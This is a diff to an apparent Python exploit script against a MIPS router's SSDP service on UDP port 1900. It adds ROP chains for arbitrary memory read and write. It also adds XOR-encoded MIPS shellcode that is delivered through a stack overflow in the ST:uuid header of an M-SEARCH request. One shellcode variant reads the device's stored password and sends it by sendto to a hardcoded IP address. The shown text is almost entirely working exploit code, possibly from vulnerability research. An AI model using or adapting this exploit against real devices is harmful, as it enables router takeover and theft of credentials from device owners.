-            # Move sockaddr from v0 into t0 (load v0 from stack, move into t0) #########Might need fixing need to check addresses!!!###########
+            # Move sockaddr from v0 into t0 (load v0 from stack, move into t0)
             # 0x0015d20c: move $t0, $v0; lw $ra, 0x2c($sp); addiu $s0, $zero, 0x163; move $v0, $s0; lw $s7, 0x28($sp); lw $s6, 0x24($sp); 
             #   lw $s5, 0x20($sp); lw $s4, 0x1c($sp); lw $s3, 0x18($sp); lw $s2, 0x14($sp); lw $s1, 0x10($sp); lw $s0, 0xc($sp); jr $ra; addiu $sp, $sp, 0x30; 
             chain += b'b' * 0xc
-            chain += p32(0xdeadbeef) # s0
-            chain += p32(0xdeadbeef) # s1
-            chain += p32(0xdeadbeef) # s2
-            chain += p32(0xdeadbeef) # s3
-            chain += p32(0xdeadbeef) # s4
-            chain += p32(0xdeadbeef) # s5
-            chain += p32(0xdeadbeef) # s6
-            chain += p32(0xdeadbeef) # s7
+            chain += p32(0xdecea5ed) # s0
+            chain += p32(0xdecea5ed) # s1
+            chain += p32(0xdecea5ed) # s2
+            chain += p32(0xdecea5ed) # s3
+            chain += p32(0xdecea5ed) # s4
+            chain += p32(0xdecea5ed) # s5
+            chain += p32(0xdecea5ed) # s6
+            chain += p32(0xdecea5ed) # s7
             chain += p32(0x1895cc + base_address) # ra
 
             # Move 0x20 into t1
             # 0x001895cc: addiu $t1, $zero, 0x20; lw $ra, 0x2c($sp); lw $s2, 0x28($sp); lw $s1, 0x24($sp); lw $s0, 0x20($sp); jr $ra; addiu $sp, $sp, 0x30;
             chain += b'b' * 0x20
-            chain += p32(0xdeadbeef) # s0
-            chain += p32(0xdeadbeef) # s1
-            chain += p32(0xdeadbeef) # s2
+            chain += p32(0xdecea5ed) # s0
+            chain += p32(0xdecea5ed) # s1
+            chain += p32(0xdecea5ed) # s2
             chain += p32(0x57864 + base_address) # ra
 
             # Load address of sendto into v0
@@ -1099,49 +1229,85 @@ elif args.command == 'http':
             # Call sendto and regain control
             # 0x15114: jalr $v0; nop; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8; 
             chain += b'b' * 4
-            chain += p32(0xdeadbeef) # ra
+            chain += p32(0xdecea5ed) # ra
+        elif (args.rop[0] == 'r'): # does a large hex dump at address specified in s0 (basically our way of reading arbitrary memory) - crashes task but not entire router
+            # Add the strings to the sX registers, and set the ra to first gadget
+            chain += p32(0x801d3754) # s0 (address to read) - currently sp
+            chain += p32(0xdecea5ed) # s1
+            chain += p32(0xdecea5ed) # s2
+            chain += p32(0xdecea5ed) # s3
+            chain += p32(0xb0228 + base_address) # ra
 
-            # ##################################################
-            # ################ Fix stack #######################
-            # ##################################################
+            # Move address into a0
+            # 0x000b0228: move $a0, $s0; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
+            chain += p32(0xdecea5ed) # s0
+            chain += p32(0x71b68 + base_address) # ra
 
-            # # For fixing
-            # old_fp = 0x802aba20
-            # old_sp = 0x802ab9c0
+            # 0x00071b68: addiu $a1, $zero, 0x8bf; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8;
+            chain += b'b' * 4
+            chain += p32(0x57864 + base_address) # ra
 
-            # # Load old sp - 0x20 into fp
-            # # 0x00016970: lw $ra, 0x1c($sp); lw $fp, 0x18($sp); addiu $sp, $sp, 0x20; jr $ra; nop;
-            # chain += b'b' * 0x18
-            # chain += p32(old_sp - 0x20) # fp
-            # chain += p32(0x1a624 + base_address) # ra
-
-            # # Move the fp into sp
-            # # 0x0001a624: move $sp, $fp; lw $ra, 0x1c($sp); lw $fp, 0x18($sp); lw $s3, 0x14($sp); lw $s2, 0x10($sp); lw $s1, 0xc($sp); lw $s0, 8($sp); jr $ra; addiu $sp, $sp, 0x20;
-            # chain += b'c' * 100
-            
-            #################################################
-            ################## reboot #######################
-            #################################################
-
-            # # Set first argument for socket to 2
-            # # 0x0011e670: addiu $a0, $zero, 2; lw $ra, 4($sp); move $v0, $zero; lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
+            # # can use this to extend how much data is read
+            # # 0x000142f0: addiu $a1, $a1, 0x4024; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8
             # chain += b'b' * 4
-            # chain += p32(0x19bc58 + base_address) # ra
+            # chain += p32(0x57864 + base_address) # ra
 
-            # # 0x0019bc58: lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
-            # chain += p32(reboot_addr + 0x7b58) # s0
-            # chain += p32(0x137960 + base_address) # ra
+            # Call hexdump
+            # Load and call hexdump
+            # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10;
+            chain += p32(0x8019966c) # v0 - hexdump address
+            chain += b'b' * 8
+            chain += p32(0x15114 + base_address) # ra
 
-            # ## The address of reboot contains a null byte, so we will have to do some subtracting (s0 is set to address of function + 0x7b58)
-            # # 0x00137960: addiu $v0, $s0, -0x7b58; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
-            # chain += p32(0xdeadbeef) # s0
-            # chain += p32(0x15114 + base_address) # ra
+            # 0x00015114: jalr $v0; nop; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8;
+            chain += b'b' * 4
+            chain += p32(0x8019b118) # ra
 
-            # ## Now call config load
-            # # 0x00015114: jalr $v0; nop; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8;
-            # chain += b'b' * 0x4
-            # chain += p32(0xdeadbeef) # ra
+            # chain += b'x' * 200
+        elif args.rop[0] == 'nc': # demonstrates the lack of crash when setting overflowed registers
+            '''
+            - just s0 : crash, pc = 801888e0
+                Except 5: AdES
+                    z0=00000000 at=fffffffe v0=00000000 v1=00000041
+                    a0=801f0000 a1=8025d521 a2=801ec064 a3=00000000
+                    t0=80260000 t1=01010101 t2=00000001 t3=000000df
+                    t4=0000000a t5=0000000d t6=802c5390 t7=00000020
+                    s0=11111111 s1=8025d500 s2=802c5268 s3=802ab9f4
+                    s4=801ef724 s5=11110015 s6=11110016 s7=11110017
+                    t8=802b5a00 t9=00000006 k0=00000000 k1=00000000
+                    gp=80269a60 sp=802ab9c0 fp=802aba20 ra=801888e0
+                    pc=801888e0 sr=1000e403 cause=80000014, badva=1111116d
+
+            - Expected values of overwritten registers (found via trial and error):
+                - s0 : 0x802c0004
+                - s1 : 0x8025d500
+                - s2 : 0x802C5268
+                - s3 : 0x802ab9f4
+                - ra : 0x801888e0
+            '''
             
+            # Add the strings to the sX registers, and set the ra to first gadget
+            chain += p32(0x802c0404) # s0
+            chain += p32(0x8025d504) # s1
+            chain += p32(0x802C5268) # s2
+            chain += p32(0x802ab9f4) # s3
+            chain += p32(0x801888e0) # ra
+        elif args.rop[0] == 'w': # achieving arbitrary write with no crash
+            address_to_write = 0x801d3754
+            value_to_write = 0x62626262
+
+            # Add the strings to the sX registers, and set the ra to first gadget
+            chain += p32(value_to_write) # s0
+            chain += p32(address_to_write) # s1
+            chain += p32(0x802C5268) # s2
+            chain += p32(0x802ab9f4) # s3
+            chain += p32(0x8013be14) # ra
+
+            # 0x8013be14: sw $s0, ($s1); lw $ra, 0xc($sp); move $v0, $s0; lw $s2, 8($sp); lw $s1, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;
+            chain += p32(0x802c0404) # s0
+            chain += p32(0x8025d504) # s1
+            chain += p32(0x802C5268) # s2
+            chain += p32(0x801888e8) # ra
         else:
             print("[-] Bad type")
             exit(1)
@@ -1164,3 +1330,287 @@ elif args.command == 'http':
         # Send the request
         s.sendall(request)
         s.close()
+    elif args.shellcode:
+        base_address = 0x80000400
+        if args.shellcode[0] == '1':
+            context.update(arch='mips', os='linux', bits=32, endian='little')
+
+            decode_shellcode = asm('''
+        /* We provided the length of the shellcode (encoded) in s2, so lets decode that */
+            xor $s2, $s2, $s3;
+        /* Current shellcode address is in s1 (should be okay to pass straight in, basically the first encoded shellcode thing)
+        /* s0 will contain the value we are decoding */
+          loop:
+        /* load the shellcode value to decode */
+            lw $s0, 0x1010($s1);
+        /* decode the value */
+            xor $s0, $s0, $s3;
+        /* save value to location it was got from */
+            sw $s0, 0x1010($s1)
+        /* decrease s2 by 4 so we can check if all decoded, decrease decoding address */
+            addiu $s2, $s2, -0x4;
+            addiu $s1, $s1, 0x108;
+        /* do some branch stuff if s2 is 0 */
+            bgtz $s2, loop;
+            addiu $s1, $s1, -0x104;
+        /* fix v0 (in branch delay slot) */
+            xor $v0, $s3, $s3;
+        /* fix s0 (0x802c0404) */
+            lui $t0, 0x802c;
+            ori $s0, $t0, 0x0404;
+        /* fix s1 (0x8025d504) */
+            lui $s1, 0x8025;
+            ori $s1, $s1, 0x0504;
+        /* fix s2 (0x802C5268) */
+            ori $s2, $t0, 0x5268;
+        /* fix s3 (0x802ab9f4) */
+            lui $s3, 0x802a;
+            ori $s3, $s3, 0xb9f4;
+        /* Fix up stack once shellcode done */
+            addiu $sp, $sp, 0xfff;
+            j 0x801888e0;
+            addiu $sp, $sp, -0xfef;
+            ''')
+
+            test_shellcode = asm('''
+            move $a0, $s2;
+            move $a1, $s1;
+            jalr $s3;
+            nop;
+            j 0x802C3638;   /* fix address */
+            xor $v0, $s3, $s3;
+            ''')
+
+            # Write our shellcode to memory with a bunch of overflows
+            decoder_addr = 0x802c3614
+            shellcode_addr = decoder_addr + len(decode_shellcode)
+
+            # Write decoder shellcode
+            for i in range(int(len(decode_shellcode)/4)):
+                pos = i * 4
+                write_memory(args.ip, decoder_addr + (i * 4), (decode_shellcode[pos]) | (decode_shellcode[pos + 1] << 8) | (decode_shellcode[pos + 2] << 16) | (decode_shellcode[pos + 3] << 24))
+                write_memory(args.ip, decoder_addr + (i * 4), (decode_shellcode[pos]) | (decode_shellcode[pos + 1] << 8) | (decode_shellcode[pos + 2] << 16) | (decode_shellcode[pos + 3] << 24))
+
+            for i in range(int(len(test_shellcode)/4)):
+                pos = i * 4
+                write_memory(args.ip, shellcode_addr + (i * 4), ((test_shellcode[pos]) | (test_shellcode[pos + 1] << 8) | (test_shellcode[pos + 2] << 16) | (test_shellcode[pos + 3] << 24)) ^ 0xf6f6f6f6)
+                write_memory(args.ip, shellcode_addr + (i * 4), ((test_shellcode[pos]) | (test_shellcode[pos + 1] << 8) | (test_shellcode[pos + 2] << 16) | (test_shellcode[pos + 3] << 24)) ^ 0xf6f6f6f6)
+
+            print(f"Decoder address: {hex(decoder_addr)}")
+            print(hexdump(decode_shellcode))
+            print(f"Shellcode address: {hex(shellcode_addr)}")
+            print(hexdump(test_shellcode))
+            print(f"Encoded shellcode:")
+            encoded_shellcode = b''
+            for i in test_shellcode:
+                encoded_shellcode += (i ^ 0xf6).to_bytes(1, 'big')
+            print(hexdump(encoded_shellcode))
+
+            #### Now call the decoder shellcode
+            payload = b'b' * 132
+
+            payload += p32(0x802c0404) # s0
+            payload += p32(shellcode_addr - 0x1010) # s1
+            payload += p32(len(test_shellcode) ^ 0xf6f6f6f6) # s2
+            payload += p32(0xf6f6f6f6) # s3
+            payload += p32(decoder_addr) # ra
+
+            # Build the request
+            request = b"M-SEARCH * HTTP/1.0\r\n"
+            request += b"HOST:239.255.255.250:1900\r\n"
+            request += b"ST:uuid:" + payload + b"\r\n"
+            request += b"MX:2\r\n"
+            request += b"MAN:\"ssdp:discover\"\r\n\r\n"
+            
+            # Create socket and connect
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.settimeout(5)
+            s.connect((args.ip, 1900))
+
+            # Send the request
+            print("Decoding payload...")
+            s.sendall(request)
+            s.close()
+
+            #### then call the decoded shellcode
+            payload = b'b' * 132
+
+            time.sleep(1) # sleep before sending so the caches get flushed
+
+            payload += p32(0x802c0404) # s0
+            payload += p32(0x801efa04) # s1 (string address) # 801c0528
+            payload += p32(0x801c3f91) # s2 (%s address)
+            payload += p32(0x8019a3a0) # s3 (printf address)
+            payload += p32(shellcode_addr) # ra
+        
+            # Build the request
+            request = b"M-SEARCH * HTTP/1.0\r\n"
+            request += b"HOST:239.255.255.250:1900\r\n"
+            request += b"ST:uuid:" + payload + b"\r\n"
+            request += b"MX:2\r\n"
+            request += b"MAN:\"ssdp:discover\"\r\n\r\n"
+            
+            # Create socket and connect
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.settimeout(5)
+            s.connect((args.ip, 1900))
+
+            # Send the request
+            print("Triggering payload...")
+            s.sendall(request)
+            s.close()
+        elif args.shellcode[0] == '2':
+            context.update(arch='mips', os='linux', bits=32, endian='little')
+
+            decode_shellcode = asm('''
+        /* We provided the length of the shellcode (encoded) in s2, so lets decode that */
+            xor $s2, $s2, $s3;
+        /* Current shellcode address is in s1 (should be okay to pass straight in, basically the first encoded shellcode thing)
+        /* s0 will contain the value we are decoding */
+          loop:
+        /* load the shellcode value to decode */
+            lw $s0, 0x1010($s1);
+        /* decode the value */
+            xor $s0, $s0, $s3;
+        /* save value to location it was got from */
+            sw $s0, 0x1010($s1)
+        /* decrease s2 by 4 so we can check if all decoded, decrease decoding address */
+            addiu $s2, $s2, -0x4;
+            addiu $s1, $s1, 0x108;
+        /* do some branch stuff if s2 is 0 */
+            bgtz $s2, loop;
+            addiu $s1, $s1, -0x104;
+        /* fix v0 (in branch delay slot) */
+            xor $v0, $s3, $s3;
+        /* fix s0 (0x802c0404) */
+            lui $t0, 0x802c;
+            ori $s0, $t0, 0x0404;
+        /* fix s1 (0x8025d504) */
+            lui $s1, 0x8025;
+            ori $s1, $s1, 0x0504;
+        /* fix s2 (0x802C5268) */
+            ori $s2, $t0, 0x5268;
+        /* fix s3 (0x802ab9f4) */
+            lui $s3, 0x802a;
+            ori $s3, $s3, 0xb9f4;
+        /* Fix up stack once shellcode done */
+            addiu $sp, $sp, 0xfff;
+            j 0x801888e0;
+            addiu $sp, $sp, -0xfef;
+            ''')
+
+            test_shellcode = asm('''
+            lw $a0, ($s1);      /* s1 contains address of 0x1010200 */
+            lui $v0, 0x8000;
+            or $v0, 0x89e4;
+            jalr $v0;           /* config_get(0x1010200 (*0x80236c4c), pwd_buffer (0x801d3754)) */
+            move $a1, $s2;      /* s2 contains pwd buffer address */
+            jalr $s0;           /* len = strlen(pwd_buffer (0x801d3754)) */
+            move $a0, $s2;      /* s2 contains pwd buffer address */
+            move $s0, $v0;      /* v0 contains length of password */
+            /* create sockaddr stuff and put into t0 */
+            lui $v0, 0x800f;
+            or $v0, $v0, 0x9528;
+            lw $v0, ($v0);      /* load value of hardcoded_afinet into v0 */
+            lui $t0, 0x802a;
+            or $s1, $t0, 0xbf10;
+            sw $v0, ($s1);      /* save hardcoded_afinet value to address of sockaddr */
+            addiu $t0, $s1, 0x4;
+            lui $v0, 0x02bc;
+            or $v0, $v0, 0xa8c0;
+            sw $v0, ($t0);      /* save hardcoded IP address to sockaddr + 4 */
+            addiu $a0, $zero, 2;
+            addiu $a1, $zero, 2;
+            jalr $s3;           /* socket(2, 2, 0) - s3 contains address of socket()*/
+            move $a2, $zero;
+            move $a0, $v0;      /* v0 contains sockfd_address */
+            move $a1, $s2;      /* s2 contains pwd buffer address */
+            move $a2, $s0;      /* s0 contains pwd length */
+            move $a3, $zero;
+            move $t0, $s1;      /* s1 contains the address of sockaddr */
+            lui $v0, 0x8012;
+            or $v0, $v0, 0x8bc4;
+            jalr $v0;           /* sendto(sockfd_addr (0x802ab9b0), pwd_buffer (0x801d3754), len, 0, sockaddr_addr (0x802ab980), 0x20); */
+            addiu $t1, $zero, 0x20;
+            j 0x802C3638;   /* fix address */
+            xor $v0, $s3, $s3;
+            ''')
+
+            # Write our shellcode to memory with a bunch of overflows
+            decoder_addr = 0x802c3614
+            shellcode_addr = decoder_addr + len(decode_shellcode)
+
+            # Write decoder shellcode
+            for i in range(int(len(decode_shellcode)/4)):
+                pos = i * 4
+                write_memory(args.ip, decoder_addr + (i * 4), (decode_shellcode[pos]) | (decode_shellcode[pos + 1] << 8) | (decode_shellcode[pos + 2] << 16) | (decode_shellcode[pos + 3] << 24))
+                write_memory(args.ip, decoder_addr + (i * 4), (decode_shellcode[pos]) | (decode_shellcode[pos + 1] << 8) | (decode_shellcode[pos + 2] << 16) | (decode_shellcode[pos + 3] << 24))
+
+            for i in range(int(len(test_shellcode)/4)):
+                pos = i * 4
+                write_memory(args.ip, shellcode_addr + (i * 4), ((test_shellcode[pos]) | (test_shellcode[pos + 1] << 8) | (test_shellcode[pos + 2] << 16) | (test_shellcode[pos + 3] << 24)) ^ 0xf6f6f6f6)
+                write_memory(args.ip, shellcode_addr + (i * 4), ((test_shellcode[pos]) | (test_shellcode[pos + 1] << 8) | (test_shellcode[pos + 2] << 16) | (test_shellcode[pos + 3] << 24)) ^ 0xf6f6f6f6)
+
+            print(f"Decoder address: {hex(decoder_addr)}")
+            print(hexdump(decode_shellcode))
+            print(f"Shellcode address: {hex(shellcode_addr)}")
+            print(hexdump(test_shellcode))
+            print(f"Encoded shellcode:")
+            encoded_shellcode = b''
+            for i in test_shellcode:
+                encoded_shellcode += (i ^ 0xf6).to_bytes(1, 'big')
+            print(hexdump(encoded_shellcode))
+
+            #### Now call the decoder shellcode
+            payload = b'b' * 132
+
+            payload += p32(0x802c0404) # s0
+            payload += p32(shellcode_addr - 0x1010) # s1
+            payload += p32(len(test_shellcode) ^ 0xf6f6f6f6) # s2
+            payload += p32(0xf6f6f6f6) # s3
+            payload += p32(decoder_addr) # ra
+
+            # Build the request
+            request = b"M-SEARCH * HTTP/1.0\r\n"
+            request += b"HOST:239.255.255.250:1900\r\n"
+            request += b"ST:uuid:" + payload + b"\r\n"
+            request += b"MX:2\r\n"
+            request += b"MAN:\"ssdp:discover\"\r\n\r\n"
+            
+            # Create socket and connect
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.settimeout(5)
+            s.connect((args.ip, 1900))
+
+            # Send the request
+            print("Decoding payload...")
+            s.sendall(request)
+            s.close()
+
+            #### then call the decoded shellcode
+            payload = b'b' * 132
+
+            time.sleep(1) # sleep before sending so the caches get flushed
+
+            payload += p32(0x801a717c) # s0 (config_get address)
+            payload += p32(0x80236c4c) # s1 (address of 0x1010200)
+            payload += p32(0x801d3754) # s2 (address of pwd buffer)
+            payload += p32(0x801293d0) # s3 (address of socket() function)
+            payload += p32(shellcode_addr) # ra
+        
+            # Build the request
+            request = b"M-SEARCH * HTTP/1.0\r\n"
+            request += b"HOST:239.255.255.250:1900\r\n"
+            request += b"ST:uuid:" + payload + b"\r\n"
+            request += b"MX:2\r\n"
+            request += b"MAN:\"ssdp:discover\"\r\n\r\n"
+            
+            # Create socket to send and connect
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.settimeout(5)
+            s.connect((args.ip, 1900))
+
+            # Send the request
+            print("Triggering payload...")
+            s.sendall(request)
+            s.close()
